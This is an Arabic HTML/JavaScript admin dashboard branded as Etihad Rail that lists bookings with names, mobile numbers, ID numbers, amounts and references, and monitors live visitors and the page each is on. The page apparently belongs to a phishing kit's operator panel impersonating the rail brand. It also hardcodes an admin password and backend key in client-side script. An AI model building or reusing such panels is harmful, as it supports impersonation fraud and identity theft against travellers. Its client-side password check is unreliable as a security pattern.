<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>لوحة الإدارة — قطارات الاتحاد</title>
<link rel="icon" href="/favicon.png" type="image/png">
<style>
:root{
  --bg:#f4f5f7;--card:#fff;--ink:#1a1a2e;--muted:#6b7280;--line:#e5e7eb;
  --green:#059669;--red:#dc2626;--orange:#d97706;--blue:#2563eb;--purple:#7c3aed;
  --gold:#C5A572;--gold-light:#f5eedf;--rail:#1a1a2e;
}
*{box-sizing:border-box;margin:0;padding:0}
html,body{background:var(--bg);color:var(--ink);font-family:"Cairo","Segoe UI",Tahoma,Arial,sans-serif;height:100%}
@import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800;900&display=swap');

.login-wrap{display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px;
  background:linear-gradient(135deg,#1a1a2e 0%,#16213e 50%,#0f3460 100%)}
.login-box{background:#fff;border-radius:24px;padding:48px 40px;width:100%;max-width:420px;
  box-shadow:0 20px 60px rgba(0,0,0,.3);text-align:center}
.login-box img{height:48px;margin-bottom:16px}
.login-box h1{font-size:24px;font-weight:800;margin-bottom:4px;color:var(--ink)}
.login-box p{color:var(--muted);font-size:14px;margin-bottom:28px}
.login-box input{width:100%;padding:16px 20px;border:2px solid var(--line);border-radius:14px;
  font-size:16px;font-family:inherit;text-align:center;outline:none;margin-bottom:16px;transition:.2s}
.login-box input:focus{border-color:var(--gold);box-shadow:0 0 0 3px rgba(197,165,114,.15)}
.login-box button{width:100%;padding:16px;background:var(--gold);color:#fff;border:none;
  border-radius:14px;font-size:16px;font-weight:700;cursor:pointer;font-family:inherit;transition:.2s}
.login-box button:hover{background:#b08f5a}
.login-err{color:var(--red);font-size:13px;margin-bottom:10px;display:none}

.layout{display:none;min-height:100vh}
.main{padding:24px 28px;min-height:100vh}

.top-bar{display:flex;align-items:center;justify-content:space-between;margin-bottom:24px;flex-wrap:wrap;gap:12px}
.top-bar h1{font-size:24px;font-weight:800;display:flex;align-items:center;gap:10px}
.top-bar h1 img{height:36px}
.top-bar-actions{display:flex;align-items:center;gap:10px}
.btn-refresh{display:flex;align-items:center;gap:6px;padding:10px 18px;background:var(--card);
  border:1.5px solid var(--line);border-radius:12px;font-size:13px;font-weight:600;cursor:pointer;
  font-family:inherit;transition:.2s}
.btn-refresh:hover{background:var(--bg);border-color:var(--ink)}
.btn-refresh svg{width:16px;height:16px;fill:var(--muted)}
.auto-dot{width:8px;height:8px;background:var(--green);border-radius:50%;animation:pulse 1.5s infinite}
@keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.4;transform:scale(.8)}}
.btn-logout{padding:10px 18px;background:var(--red);color:#fff;border:none;border-radius:12px;
  font-size:13px;font-weight:600;cursor:pointer;font-family:inherit}

.stats-row{display:grid;grid-template-columns:repeat(4,1fr);gap:14px;margin-bottom:24px}
@media(max-width:900px){.stats-row{grid-template-columns:repeat(2,1fr)}}
@media(max-width:500px){.stats-row{grid-template-columns:1fr}}
.stat-card{background:var(--card);border-radius:16px;padding:20px 22px;
  box-shadow:0 1px 3px rgba(0,0,0,.06);position:relative;overflow:hidden}
.stat-card::after{content:"";position:absolute;top:0;right:0;width:4px;height:100%;border-radius:0 16px 16px 0}
.stat-card.s-active{cursor:pointer;transition:.2s}
.stat-card.s-active:hover{transform:translateY(-2px);box-shadow:0 4px 12px rgba(0,0,0,.1)}
.stat-card.s-active::after{background:var(--green)}
.stat-card.s-total::after{background:var(--blue)}
.stat-card.s-pending::after{background:var(--orange)}
.stat-card.s-done::after{background:var(--gold)}
.stat-label{font-size:13px;font-weight:600;color:var(--muted);display:flex;align-items:center;gap:6px;margin-bottom:6px}
.stat-num{font-size:32px;font-weight:900}
.stat-card.s-active .stat-num{color:var(--green)}
.stat-card.s-total .stat-num{color:var(--blue)}
.stat-card.s-pending .stat-num{color:var(--orange)}
.stat-card.s-done .stat-num{color:var(--gold)}
.wifi-icon{display:inline-flex;align-items:center}
.wifi-icon svg{width:20px;height:20px;fill:var(--green);animation:pulse 1.5s infinite}

.card-box{background:var(--card);border-radius:16px;padding:20px 22px;box-shadow:0 1px 3px rgba(0,0,0,.06);margin-bottom:20px}
.card-box h2{font-size:18px;font-weight:800;margin-bottom:14px;display:flex;align-items:center;gap:8px}
.search-row{display:flex;gap:10px;margin-bottom:14px;flex-wrap:wrap}
.search-row input,.search-row select{padding:10px 14px;border:1.5px solid var(--line);border-radius:10px;
  font-size:13px;font-family:inherit;outline:none;flex:1;min-width:140px}
.search-row input:focus,.search-row select:focus{border-color:var(--gold)}
.tbl-wrap{overflow-x:auto;-webkit-overflow-scrolling:touch}
table{width:100%;border-collapse:collapse;font-size:13px;min-width:900px}
th{background:var(--bg);padding:10px 12px;text-align:right;font-weight:700;color:var(--muted);
  white-space:nowrap;position:sticky;top:0}
td{padding:10px 12px;border-bottom:1px solid var(--line);vertical-align:middle}
tr:hover td{background:#fafafa}
.badge{display:inline-block;padding:3px 10px;border-radius:999px;font-size:11px;font-weight:700}
.badge-green{background:#d1fae5;color:#065f46}
.badge-orange{background:#fef3c7;color:#92400e}
.badge-red{background:#fee2e2;color:#991b1b}
.badge-blue{background:#dbeafe;color:#1e40af}
.badge-gray{background:#f3f4f6;color:#4b5563}
.badge-gold{background:var(--gold-light);color:#8b6914}
.badge-purple{background:#ede9fe;color:#5b21b6}
.copy-btn{background:none;border:1px solid var(--line);border-radius:6px;padding:3px 8px;
  font-size:11px;cursor:pointer;font-family:inherit;color:var(--ink);transition:.15s}
.copy-btn:hover{background:var(--bg);border-color:var(--gold)}
.copy-btn:active{background:var(--gold-light)}
.act-btn{background:none;border:1px solid var(--line);border-radius:8px;padding:5px 10px;
  font-size:12px;font-weight:600;cursor:pointer;font-family:inherit;transition:.15s;white-space:nowrap}
.act-btn:hover{border-color:var(--gold);color:var(--gold)}
.act-btn.del{color:var(--red);border-color:var(--red)}
.act-btn.del:hover{background:#fee2e2}
.empty-row{text-align:center;padding:40px;color:var(--muted)}

.modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,.5);display:none;align-items:center;
  justify-content:center;z-index:999;padding:20px;backdrop-filter:blur(4px)}
.modal-overlay.open{display:flex}
.modal-box{background:var(--card);border-radius:20px;padding:28px;width:100%;max-width:600px;
  max-height:85vh;overflow-y:auto;position:relative;box-shadow:0 20px 60px rgba(0,0,0,.3)}
.modal-close{position:absolute;top:14px;left:14px;background:none;border:none;font-size:26px;
  cursor:pointer;color:var(--muted);line-height:1}
.modal-box h2{font-size:18px;font-weight:800;margin-bottom:14px}

.visitors-list{display:flex;flex-direction:column;gap:10px;max-height:60vh;overflow-y:auto;padding-left:4px}
.visitor-row{background:var(--bg);border:1px solid var(--line);border-radius:12px;padding:14px}
.visitor-head{display:flex;align-items:center;justify-content:space-between;gap:10px}
.visitor-head .v-id{font-size:14px;font-weight:700;display:flex;align-items:center;gap:6px}
.visitor-head .v-time{font-size:11px;color:var(--muted)}
.visitor-sid{font-family:monospace;font-size:11px;color:var(--muted);direction:ltr;text-align:left;word-break:break-all;margin-top:6px}
.visitors-empty{text-align:center;padding:40px 20px;color:var(--muted);font-size:14px}

.detail-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px}
.detail-grid .dg-item{background:var(--bg);border-radius:10px;padding:10px 14px}
.detail-grid .dg-label{font-size:11px;color:var(--muted);margin-bottom:2px}
.detail-grid .dg-value{font-size:14px;font-weight:700;word-break:break-all}
.detail-grid .dg-full{grid-column:1/-1}

.toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%);background:var(--ink);color:#fff;
  padding:12px 28px;border-radius:12px;font-size:13px;font-weight:600;z-index:9999;
  opacity:0;transition:opacity .3s;pointer-events:none}
.toast.show{opacity:1}
</style>
</head>
<body>

<!-- Login -->
<div class="login-wrap" id="loginView">
  <div class="login-box">
    <img src="/etihad_rail_logo.png" alt="قطارات الاتحاد">
    <h1>لوحة الإدارة</h1>
    <p>أدخل كلمة المرور للوصول إلى لوحة التحكم</p>
    <div class="login-err" id="loginErr">كلمة المرور غير صحيحة</div>
    <input type="password" id="loginPass" placeholder="كلمة المرور" autofocus
      onkeydown="if(event.key==='Enter')doLogin()">
    <button onclick="doLogin()">دخول</button>
  </div>
</div>

<!-- Dashboard -->
<div class="layout" id="dashView">
  <div class="main">

    <div class="top-bar">
      <h1>
        <img src="/etihad_rail_logo.png" alt="قطارات الاتحاد">
        لوحة الإدارة
      </h1>
      <div class="top-bar-actions">
        <div class="auto-dot" title="تحديث تلقائي كل 3 ثوانٍ"></div>
        <button class="btn-refresh" onclick="refresh()">
          <svg viewBox="0 0 24 24"><path d="M17.65 6.35A7.96 7.96 0 0 0 12 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08A5.99 5.99 0 0 1 12 18c-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"/></svg>
          تحديث
        </button>
        <button class="btn-logout" onclick="doLogout()">خروج</button>
      </div>
    </div>

    <!-- Stats -->
    <div class="stats-row">
      <div class="stat-card s-active" onclick="openVisitorsModal()" title="عرض الزوار النشطين">
        <div class="stat-label">
          <span class="wifi-icon"><svg viewBox="0 0 24 24"><path d="M1 9l2 2c4.97-4.97 13.03-4.97 18 0l2-2C16.93 2.93 7.08 2.93 1 9zm8 8l3 3 3-3a4.24 4.24 0 0 0-6 0zm-4-4l2 2a7.07 7.07 0 0 1 10 0l2-2C15.14 9.14 8.87 9.14 5 13z"/></svg></span>
          نشط الآن
        </div>
        <div class="stat-num" id="sActive">0</div>
      </div>
      <div class="stat-card s-total">
        <div class="stat-label">إجمالي الحجوزات</div>
        <div class="stat-num" id="sTotal">0</div>
      </div>
      <div class="stat-card s-pending">
        <div class="stat-label">جديد</div>
        <div class="stat-num" id="sPending">0</div>
      </div>
      <div class="stat-card s-done">
        <div class="stat-label">مكتمل</div>
        <div class="stat-num" id="sDone">0</div>
      </div>
    </div>

    <!-- Bookings Table -->
    <div class="card-box">
      <h2>
        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M16 10a4 4 0 0 1-8 0"/><path d="M3.4 5.467a2 2 0 0 0-.4 1.2V20a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V6.667a2 2 0 0 0-.4-1.2l-2-2.667A2 2 0 0 0 17 2H7a2 2 0 0 0-1.6.8z"/></svg>
        الحجوزات
      </h2>
      <div class="search-row">
        <input type="text" id="searchInput" placeholder="بحث بالاسم أو رقم الجوال أو رقم الهوية..." oninput="renderOrders()">
        <select id="filterStatus" onchange="renderOrders()">
          <option value="">جميع الحالات</option>
          <option value="new">جديد</option>
          <option value="confirmed">مؤكد</option>
          <option value="completed">مكتمل</option>
          <option value="cancelled">ملغي</option>
        </select>
      </div>
      <div class="tbl-wrap">
        <table>
          <thead>
            <tr>
              <th>#</th>
              <th>الحالة</th>
              <th>الاسم</th>
              <th>الجوال</th>
              <th>رقم الهوية</th>
              <th>المسار</th>
              <th>الركاب</th>
              <th>المبلغ</th>
              <th>المرجع</th>
              <th>التاريخ</th>
              <th>إجراءات</th>
            </tr>
          </thead>
          <tbody id="ordersBody">
            <tr><td colspan="11" class="empty-row">جاري التحميل...</td></tr>
          </tbody>
        </table>
      </div>
    </div>

  </div>
</div>

<!-- Visitors Modal -->
<div class="modal-overlay" id="visitorsModal">
  <div class="modal-box">
    <button class="modal-close" onclick="closeModal('visitorsModal')">×</button>
    <h2>الزوار النشطين الآن (<span id="visitorsCount">0</span>)</h2>
    <div class="visitors-list" id="visitorsList">
      <div class="visitors-empty">جاري التحميل...</div>
    </div>
  </div>
</div>

<!-- Detail Modal -->
<div class="modal-overlay" id="detailModal">
  <div class="modal-box" style="max-width:700px">
    <button class="modal-close" onclick="closeModal('detailModal')">×</button>
    <h2>تفاصيل الحجز</h2>
    <div class="detail-grid" id="detailGrid"></div>
  </div>
</div>

<!-- Toast -->
<div class="toast" id="toast"></div>

<script>
var SUPABASE_URL = "https://rfmbqnfjfaheiyfmaszu.supabase.co";
var SUPABASE_KEY = "sb_publishable_Pncr0c7uPG8FNqH5qWz7cQ_kA-0uKIA";
var ADMIN_PASS = "Admin@2026!";
var REST = SUPABASE_URL + "/rest/v1";
var HEADERS = {
  "apikey": SUPABASE_KEY,
  "Authorization": "Bearer " + SUPABASE_KEY,
  "Content-Type": "application/json",
  "Prefer": "return=representation"
};

var AUTHED = false;
var ALL_ORDERS = [];
var LAST_VISITORS = [];

function doLogin() {
  var p = document.getElementById("loginPass").value;
  if (p === ADMIN_PASS) {
    AUTHED = true;
    sessionStorage.setItem("er_admin", "1");
    document.getElementById("loginView").style.display = "none";
    document.getElementById("dashView").style.display = "block";
    refresh();
  } else {
    var el = document.getElementById("loginErr");
    el.style.display = "block";
    setTimeout(function() { el.style.display = "none"; }, 3000);
  }
}
function doLogout() {
  AUTHED = false;
  sessionStorage.removeItem("er_admin");
  document.getElementById("dashView").style.display = "none";
  document.getElementById("loginView").style.display = "flex";
}
function checkAuth() {
  if (sessionStorage.getItem("er_admin") === "1") {
    AUTHED = true;
    document.getElementById("loginView").style.display = "none";
    document.getElementById("dashView").style.display = "block";
    refresh();
  }
}

function sbGet(table, query) {
  var url = REST + "/" + table + (query ? "?" + query : "");
  return fetch(url, { headers: HEADERS }).then(function(res) {
    if (!res.ok) return [];
    return res.json();
  }).catch(function() { return []; });
}
function sbDelete(table, id) {
  var url = REST + "/" + table + "?id=eq." + id;
  return fetch(url, { method: "DELETE", headers: HEADERS });
}

function parseAddress(addr) {
  if (!addr) return {};
  var result = {};
  var parts = addr.split(" • ");
  for (var i = 0; i < parts.length; i++) {
    var p = parts[i].trim();
    if (p.indexOf("|") !== -1) {
      var dp = p.split("|");
      result.departure = dp[0].trim();
      if (dp[1]) result.returnInfo = dp[1].trim();
    } else if (/\d+\s*راكب/.test(p)) {
      var m = p.match(/(\d+)\s*راكب/);
      if (m) result.passengers = m[1];
    } else if (/[\d,.]+\s*(AED|درهم)/i.test(p)) {
      var m2 = p.match(/([\d,.]+)\s*(AED|درهم)/i);
      if (m2) result.amount = m2[1] + " " + m2[2];
    } else if (/^[A-Z]{2,}-[A-Z0-9]+$/i.test(p)) {
      result.reference = p;
    } else if (!result.extra) {
      result.extra = p;
    }
  }
  return result;
}

function parseNotes(notes) {
  if (!notes) return {};
  var result = {};
  var parts = notes.split(" • ");
  for (var i = 0; i < parts.length; i++) {
    var p = parts[i].trim();
    if (p.indexOf("البريد:") === 0) result.email = p.replace("البريد:", "").trim();
    else if (p.indexOf("الدرجة:") === 0) result.travelClass = p.replace("الدرجة:", "").trim();
    else if (p.indexOf("الوصول:") === 0) result.arrival = p.replace("الوصول:", "").trim();
    else if (p.indexOf("المغادرة:") === 0) result.departureStation = p.replace("المغادرة:", "").trim();
    else {
      if (!result.other) result.other = [];
      result.other.push(p);
    }
  }
  return result;
}

function loadOrders() {
  if (!AUTHED) return;
  sbGet("visitors", "select=*&order=created_at.desc").then(function(data) {
    ALL_ORDERS = data || [];
    updateStats();
    renderOrders();
  });
}

function loadActiveVisitors() {
  if (!AUTHED) return;
  sbGet("site_visitors", "select=*&order=created_at.desc&limit=200").then(function(data) {
    if (!data || !data.length) {
      LAST_VISITORS = [];
    } else {
      var cutoff = Date.now() - 300000;
      var hasLastSeen = data[0].last_seen_at !== undefined && data[0].last_seen_at !== null;
      LAST_VISITORS = data.filter(function(v) {
        var t = hasLastSeen ? (v.last_seen_at || v.created_at) : v.created_at;
        return t && new Date(t).getTime() > cutoff;
      });
    }
    document.getElementById("sActive").textContent = LAST_VISITORS.length;
    if (document.getElementById("visitorsModal").classList.contains("open")) {
      renderVisitors(LAST_VISITORS);
    }
  });
}

function refresh() {
  loadOrders();
  loadActiveVisitors();
}

function updateStats() {
  document.getElementById("sTotal").textContent = ALL_ORDERS.length;
  var newCount = ALL_ORDERS.filter(function(o) { return o.status === "new" || !o.status; }).length;
  var doneCount = ALL_ORDERS.filter(function(o) {
    return o.status === "completed" || o.status === "confirmed";
  }).length;
  document.getElementById("sPending").textContent = newCount;
  document.getElementById("sDone").textContent = doneCount;
}

function statusBadge(s) {
  var map = {
    "new": ["جديد", "badge-blue"],
    "confirmed": ["مؤكد", "badge-green"],
    "completed": ["مكتمل", "badge-gold"],
    "cancelled": ["ملغي", "badge-red"],
    "pending": ["قيد الانتظار", "badge-orange"],
    "rail_booking": ["حجز قطار", "badge-purple"]
  };
  var entry = map[s];
  if (!entry) entry = [s || "—", "badge-gray"];
  return '<span class="badge ' + entry[1] + '">' + entry[0] + '</span>';
}

function timeAgo(iso) {
  if (!iso) return "";
  var diff = Math.floor((Date.now() - new Date(iso).getTime()) / 1000);
  if (diff < 10) return "الآن";
  if (diff < 60) return diff + " ث";
  if (diff < 3600) return Math.floor(diff / 60) + " د";
  if (diff < 86400) return Math.floor(diff / 3600) + " س";
  return Math.floor(diff / 86400) + " ي";
}

function formatDate(iso) {
  if (!iso) return "—";
  var d = new Date(iso);
  return d.toLocaleDateString("ar-AE", { month: "short", day: "numeric", hour: "2-digit", minute: "2-digit" });
}

function esc(str) {
  if (!str) return "";
  var div = document.createElement("div");
  div.appendChild(document.createTextNode(str));
  return div.innerHTML;
}

function renderOrders() {
  var q = (document.getElementById("searchInput").value || "").toLowerCase().trim();
  var sf = document.getElementById("filterStatus").value;
  var list = ALL_ORDERS;
  if (sf) list = list.filter(function(o) { return o.status === sf; });
  if (q) list = list.filter(function(o) {
    return (o.name || "").toLowerCase().indexOf(q) !== -1 ||
      (o.mobile || "").indexOf(q) !== -1 ||
      (o.id_number || "").indexOf(q) !== -1;
  });
  var tbody = document.getElementById("ordersBody");
  if (!list.length) {
    tbody.innerHTML = '<tr><td colspan="11" class="empty-row">لا توجد نتائج</td></tr>';
    return;
  }
  tbody.innerHTML = list.map(function(o, i) {
    var parsed = parseAddress(o.address);
    var route = esc(o.card_type || "—");
    var passengers = esc(parsed.passengers || "—");
    var amount = esc(parsed.amount || "—");
    var ref = parsed.reference || "";
    var refDisplay = ref ? esc(ref) : "—";
    var refCopy = ref ? ' <button class="copy-btn" onclick="copyText(\'' + esc(ref) + '\')">نسخ</button>' : '';
    return '<tr>' +
      '<td>' + (i + 1) + '</td>' +
      '<td>' + statusBadge(o.status) + '</td>' +
      '<td style="font-weight:700">' + esc(o.name || "—") + '</td>' +
      '<td style="direction:ltr;white-space:nowrap">' + esc(o.mobile || "—") + '</td>' +
      '<td>' + esc(o.id_number || "—") + '</td>' +
      '<td style="font-size:12px">' + route + '</td>' +
      '<td>' + passengers + '</td>' +
      '<td style="font-weight:700;color:var(--green)">' + amount + '</td>' +
      '<td style="font-family:monospace;font-size:12px;direction:ltr">' + refDisplay + refCopy + '</td>' +
      '<td style="font-size:12px;white-space:nowrap">' + formatDate(o.created_at) + '</td>' +
      '<td style="white-space:nowrap">' +
        '<button class="act-btn" onclick="viewDetail(\'' + o.id + '\')">عرض</button> ' +
        '<button class="act-btn del" onclick="deleteOrder(\'' + o.id + '\')">حذف</button>' +
      '</td>' +
    '</tr>';
  }).join("");
}

function renderVisitors(list) {
  document.getElementById("visitorsCount").textContent = list.length;
  var box = document.getElementById("visitorsList");
  if (!list.length) {
    box.innerHTML = '<div class="visitors-empty">لا يوجد زوار نشطين الآن</div>';
    return;
  }
  box.innerHTML = list.map(function(v) {
    var vid = v.visitor_id || v.id || "";
    var lastTime = v.last_seen_at || v.created_at;
    var lastPage = v.last_page || "";
    var pageTag = lastPage ? '<span style="font-size:11px;background:var(--gold-light);color:#8b6914;padding:3px 10px;border-radius:999px;font-weight:700">' + esc(lastPage) + '</span>' : '';
    return '<div class="visitor-row">' +
      '<div class="visitor-head">' +
        '<div class="v-id">🌐 زائر ' + pageTag + '</div>' +
        '<span class="v-time">' + timeAgo(lastTime) + '</span>' +
      '</div>' +
      '<div class="visitor-sid">' + esc(vid) + '</div>' +
    '</div>';
  }).join("");
}

function openVisitorsModal() {
  openModal("visitorsModal");
  renderVisitors(LAST_VISITORS);
  loadActiveVisitors();
}

function viewDetail(id) {
  var o = null;
  for (var i = 0; i < ALL_ORDERS.length; i++) {
    if (String(ALL_ORDERS[i].id) === String(id)) { o = ALL_ORDERS[i]; break; }
  }
  if (!o) return;
  var parsed = parseAddress(o.address);
  var notes = parseNotes(o.address_notes);
  var fields = [
    ["الحالة", o.status, true],
    ["نوع الطلب", o.order_type],
    ["الاسم", o.name],
    ["رقم الجوال", o.mobile],
    ["رقم الهوية", o.id_number],
    ["المسار", o.card_type],
    ["تاريخ المغادرة", parsed.departure],
    ["العودة", parsed.returnInfo],
    ["عدد الركاب", parsed.passengers],
    ["المبلغ الإجمالي", parsed.amount],
    ["رقم المرجع", parsed.reference],
    ["البريد الإلكتروني", notes.email],
    ["درجة السفر", notes.travelClass],
    ["معلومات الوصول", notes.arrival],
    ["تاريخ الإنشاء", formatDate(o.created_at)],
    ["آخر نشاط", formatDate(o.last_activity_at)]
  ];
  if (o.address) fields.push(["تفاصيل الرحلة", o.address, false, true]);
  if (o.address_notes) fields.push(["ملاحظات إضافية", o.address_notes, false, true]);

  document.getElementById("detailGrid").innerHTML = fields.map(function(f) {
    var label = f[0];
    var val = f[1];
    var isStatus = f[2] || false;
    var isFull = f[3] || false;
    var displayVal;
    if (isStatus) {
      displayVal = statusBadge(val);
    } else {
      displayVal = esc(val ? String(val) : "—");
    }
    var copyBtn = "";
    if (!isStatus && val && String(val) !== "—" && String(val).length > 1) {
      copyBtn = ' <button class="copy-btn" onclick="copyText(\'' + esc(String(val)).replace(/'/g, "\\&#39;") + '\')">نسخ</button>';
    }
    return '<div class="dg-item' + (isFull ? ' dg-full' : '') + '">' +
      '<div class="dg-label">' + label + '</div>' +
      '<div class="dg-value">' + displayVal + copyBtn + '</div>' +
    '</div>';
  }).join("");
  openModal("detailModal");
}

function deleteOrder(id) {
  if (!confirm("هل تريد حذف هذا الحجز نهائيا؟")) return;
  sbDelete("visitors", id).then(function() {
    showToast("تم حذف الحجز");
    loadOrders();
  });
}

function openModal(id) { document.getElementById(id).classList.add("open"); }
function closeModal(id) { document.getElementById(id).classList.remove("open"); }
document.querySelectorAll(".modal-overlay").forEach(function(el) {
  el.addEventListener("click", function(e) { if (e.target === el) el.classList.remove("open"); });
});

function showToast(msg) {
  var el = document.getElementById("toast");
  el.textContent = msg;
  el.classList.add("show");
  setTimeout(function() { el.classList.remove("show"); }, 2500);
}

function copyText(text) {
  navigator.clipboard.writeText(text).then(function() { showToast("تم النسخ: " + text); });
}

checkAuth();
setInterval(function() {
  if (AUTHED) {
    loadOrders();
    loadActiveVisitors();
  }
}, 3000);
</script>
</body>
</html>
